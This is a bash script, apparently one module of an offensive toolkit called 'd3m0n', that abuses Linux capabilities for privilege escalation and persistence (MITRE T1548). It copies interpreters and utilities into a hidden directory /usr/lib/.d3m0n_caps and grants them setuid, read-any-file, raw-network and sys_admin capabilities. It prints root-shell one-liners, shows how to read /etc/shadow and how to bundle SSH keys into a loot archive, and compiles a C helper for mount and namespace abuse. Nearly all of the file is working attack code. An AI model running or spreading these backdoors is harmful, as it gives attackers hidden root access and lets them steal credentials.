#!/bin/bash
# T1548 — Abuse Elevation Control: Linux Capabilities
# Grant, exploit, and persist via Linux capabilities

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_caps"

banner_caps() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1548 — Linux Capabilities Abuse            ║"
    echo "  ║   Granular privilege escalation via caps       ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

cap_setuid() {
    echo -e "${CYAN}[*] Grant cap_setuid+ep for root escalation${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v setcap &>/dev/null; then
        echo -e "${RED}[!] setcap not found. Install: apt install libcap2-bin${NC}"
        return
    fi

    echo "  Candidate interpreters:"
    local -a BINS=()
    local i=0
    for bin in python3 python2 python perl ruby node php; do
        local path
        path=$(command -v "$bin" 2>/dev/null)
        [[ -n "$path" ]] && {
            echo -e "  ${CYAN}[$i]${NC} $path"
            BINS+=("$path")
            i=$((i + 1))
        }
    done

    # Also offer common binaries
    for bin in /usr/bin/find /usr/bin/vim /usr/bin/less /usr/bin/awk /usr/bin/env; do
        [[ -x "$bin" ]] && {
            echo -e "  ${CYAN}[$i]${NC} $bin"
            BINS+=("$bin")
            i=$((i + 1))
        }
    done

    read -p "  Select binary [0] or type path: " sel

    local TARGET
    if [[ "$sel" =~ ^[0-9]+$ ]] && [[ -n "${BINS[$sel]}" ]]; then
        TARGET="${BINS[$sel]}"
    elif [[ -x "$sel" ]]; then
        TARGET="$sel"
    else
        echo -e "${RED}[!] Invalid selection${NC}"
        return
    fi

    # If binary is a symlink, resolve it (caps can't be set on symlinks)
    local REAL
    REAL=$(readlink -f "$TARGET")

    # Copy binary to avoid modifying system binary in-place
    local CAP_DIR="/usr/lib/.d3m0n_caps"
    mkdir -p "$CAP_DIR" 2>/dev/null
    local DEST="${CAP_DIR}/$(basename "$REAL")"
    cp "$REAL" "$DEST" 2>/dev/null
    chmod 755 "$DEST" 2>/dev/null

    setcap cap_setuid,cap_setgid+ep "$DEST" 2>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] cap_setuid+ep set on: ${DEST}${NC}"
        echo ""
        echo -e "${YELLOW}[*] Exploitation:${NC}"
        local bn
        bn=$(basename "$REAL")
        case "$bn" in
            python*) echo -e "  ${DEST} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" ;;
            perl)    echo -e "  ${DEST} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'" ;;
            ruby)    echo -e "  ${DEST} -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'" ;;
            node)    echo -e "  ${DEST} -e 'process.setuid(0); require(\"child_process\").execSync(\"/bin/bash\",{stdio:\"inherit\"})'" ;;
            php)     echo -e "  ${DEST} -r 'posix_setuid(0); system(\"/bin/bash\");'" ;;
            *)       echo -e "  Binary: ${DEST} (exploit depends on binary functionality)" ;;
        esac
    else
        echo -e "${RED}[!] Failed to set capabilities${NC}"
    fi
}

cap_dac_read() {
    echo -e "${CYAN}[*] Grant cap_dac_read_search for universal file read${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    local CAP_DIR="/usr/lib/.d3m0n_caps"
    mkdir -p "$CAP_DIR" 2>/dev/null

    # Copy cat and tar for file reading/exfil
    for bin in cat tar; do
        local SRC
        SRC=$(command -v "$bin" 2>/dev/null)
        [[ -z "$SRC" ]] && continue
        SRC=$(readlink -f "$SRC")
        local DEST="${CAP_DIR}/${bin}"
        cp "$SRC" "$DEST" 2>/dev/null
        chmod 755 "$DEST" 2>/dev/null
        setcap cap_dac_read_search+ep "$DEST" 2>/dev/null
        echo -e "${GREEN}  [+] ${DEST} — can read any file${NC}"
    done

    echo -e "${YELLOW}[*] Usage: ${CAP_DIR}/cat /etc/shadow${NC}"
    echo -e "${YELLOW}[*] Usage: ${CAP_DIR}/tar czf /tmp/loot.tgz /root/.ssh/ /etc/shadow${NC}"
}

cap_net_raw() {
    echo -e "${CYAN}[*] Grant cap_net_raw for packet capture${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    local CAP_DIR="/usr/lib/.d3m0n_caps"
    mkdir -p "$CAP_DIR" 2>/dev/null

    for bin in tcpdump nmap python3; do
        local SRC
        SRC=$(command -v "$bin" 2>/dev/null)
        [[ -z "$SRC" ]] && continue
        SRC=$(readlink -f "$SRC")
        local DEST="${CAP_DIR}/${bin}"
        cp "$SRC" "$DEST" 2>/dev/null
        chmod 755 "$DEST" 2>/dev/null
        setcap cap_net_raw,cap_net_admin+ep "$DEST" 2>/dev/null
        echo -e "${GREEN}  [+] ${DEST} — can sniff network${NC}"
    done

    echo -e "${YELLOW}[*] Any user can now capture packets with these binaries${NC}"
}

cap_sys_admin() {
    echo -e "${CYAN}[*] Grant cap_sys_admin for mount/namespace abuse${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    local CAP_DIR="/usr/lib/.d3m0n_caps"
    mkdir -p "$CAP_DIR" 2>/dev/null

    # Create a small C binary that uses cap_sys_admin to mount and chroot
    cat > "/tmp/_cap_admin.c" << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sched.h>
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <command>\n", argv[0]);
        printf("  mount  - bind mount / to /tmp/.d3m0n_root\n");
        printf("  unshare - create new mount namespace\n");
        return 1;
    }
    if (strcmp(argv[1], "mount") == 0) {
        mkdir("/tmp/.d3m0n_root", 0755);
        if (mount("/", "/tmp/.d3m0n_root", NULL, MS_BIND, NULL) == 0) {
            printf("[+] Bind mounted / to /tmp/.d3m0n_root\n");
            printf("[+] Access: ls /tmp/.d3m0n_root/root/\n");
        } else { perror("mount"); }
    } else if (strcmp(argv[1], "unshare") == 0) {
        if (unshare(CLONE_NEWNS) == 0) {
            printf("[+] New mount namespace created\n");
            execl("/bin/bash", "bash", NULL);
        } else { perror("unshare"); }
    }
    return 0;
}
CEOF

    if command -v gcc &>/dev/null; then
        gcc -o "${CAP_DIR}/cap_admin" /tmp/_cap_admin.c 2>/dev/null
        rm -f /tmp/_cap_admin.c
        chmod 755 "${CAP_DIR}/cap_admin"
        setcap cap_sys_admin+ep "${CAP_DIR}/cap_admin" 2>/dev/null
        echo -e "${GREEN}[+] ${CAP_DIR}/cap_admin — mount/unshare without root${NC}"
    else
        rm -f /tmp/_cap_admin.c
        echo -e "${RED}[!] gcc required${NC}"
    fi
}

cap_scan() {
    echo -e "${CYAN}[*] Scanning system for capability-enabled binaries...${NC}"

    echo -e "\n  ${YELLOW}=== Files with capabilities ===${NC}"
    getcap -r / 2>/dev/null | while IFS= read -r line; do
        echo -e "  $line"
    done

    echo -e "\n  ${YELLOW}=== D3m0n capability binaries ===${NC}"
    if [[ -d /usr/lib/.d3m0n_caps ]]; then
        for f in /usr/lib/.d3m0n_caps/*; do
            [[ -f "$f" ]] || continue
            local caps
            caps=$(getcap "$f" 2>/dev/null)
            echo -e "  ${GREEN}${caps}${NC}"
        done
    else
        echo -e "  ${YELLOW}None deployed${NC}"
    fi
}

cap_cleanup() {
    echo -e "${CYAN}[*] Removing d3m0n capability binaries...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if [[ -d /usr/lib/.d3m0n_caps ]]; then
        rm -rf /usr/lib/.d3m0n_caps
        echo -e "${GREEN}[+] Removed /usr/lib/.d3m0n_caps/${NC}"
    else
        echo -e "${YELLOW}[!] No capability binaries found${NC}"
    fi
}

main() {
    banner_caps

    echo -e "  ${CYAN}[1]${NC} cap_setuid+ep — root via interpreter (python/perl/ruby)"
    echo -e "  ${CYAN}[2]${NC} cap_dac_read_search — read any file (shadow, SSH keys)"
    echo -e "  ${CYAN}[3]${NC} cap_net_raw — network sniffing without root"
    echo -e "  ${CYAN}[4]${NC} cap_sys_admin — mount/namespace abuse"
    echo -e "  ${CYAN}[5]${NC} Scan for cap-enabled binaries"
    echo -e "  ${CYAN}[6]${NC} Cleanup"
    echo ""
    read -p "Choose [1-6]: " OPT

    case "$OPT" in
        1) cap_setuid ;;
        2) cap_dac_read ;;
        3) cap_net_raw ;;
        4) cap_sys_admin ;;
        5) cap_scan ;;
        6) cap_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
